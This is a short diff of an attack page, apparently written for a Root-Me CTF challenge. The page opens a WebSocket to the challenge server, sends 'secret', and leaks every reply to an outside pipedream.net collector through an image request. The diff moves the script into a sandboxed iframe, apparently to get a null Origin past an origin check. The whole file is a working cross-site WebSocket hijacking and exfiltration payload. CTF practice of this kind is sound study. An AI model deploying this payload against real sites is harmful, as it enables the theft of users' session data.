@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <iframe sandbox="allow-scripts" srcdoc="
   <script>
-    const ws = new WebSocket('ws://ctf20.root-me.org/ws');
-
-    ws.onopen = () => {
-      ws.send("secret");
+    var myws = new WebSocket('ws://ctf20.root-me.org/ws');
+    myws.onopen = () => {
+      myws.send('secret');
     };
-
-    ws.onmessage = (event) => {
-      new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data);
+    myws.onmessage = (e) => {
+      new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(e.data);
     };
   </script>
+"></iframe>
 </body>
 </html>
